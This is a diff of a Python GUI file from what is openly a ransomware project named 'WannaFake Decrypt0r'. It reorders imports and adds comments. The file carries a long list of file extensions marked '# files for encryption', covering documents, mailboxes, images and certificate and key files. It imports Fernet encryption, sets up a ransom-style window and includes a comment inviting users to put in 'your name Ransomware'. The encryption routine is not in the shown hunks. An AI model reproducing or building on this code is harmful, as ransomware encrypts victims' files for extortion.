@@ -1,15 +1,20 @@
-import time
-import threading
+# __Author__ __Lencof__
+# GUI.py
+
 import os
-import socket
-import webbrowser
+import sys
+import time
+import socket 
 import datetime
+import threading
+import webbrowser
 import tkinter.messagebox
 from pathlib import Path
 from cryptography.fernet import Fernet
 from tempfile import gettempdir
 from tkinter import *
 
+# files for encryption
 file_extension = ('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                   '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1',
                   '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc',
@@ -23,6 +28,7 @@ file_extension = ('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                   '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds',
                   '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der')
 
+# create class GUI(Frame):
 class GUI(Frame):
     def __init__(self, master):
         Frame.__init__(self, master)
@@ -187,9 +193,9 @@ if __name__ == "__main__":
     root = Tk()
     app = GUI(root)
 
-    root.geometry('950x600')
-    root.title('WannaFake Decrypt0r')
+    root.geometry('950x600') # your size
+    root.title('WannaFake Decrypt0r') # your name Ransomware
     root.resizable(False, False)
     root.configure(background=app._from_rgb((139, 0, 0)))
 
-    root.mainloop()
+    root.mainloop() # exit()
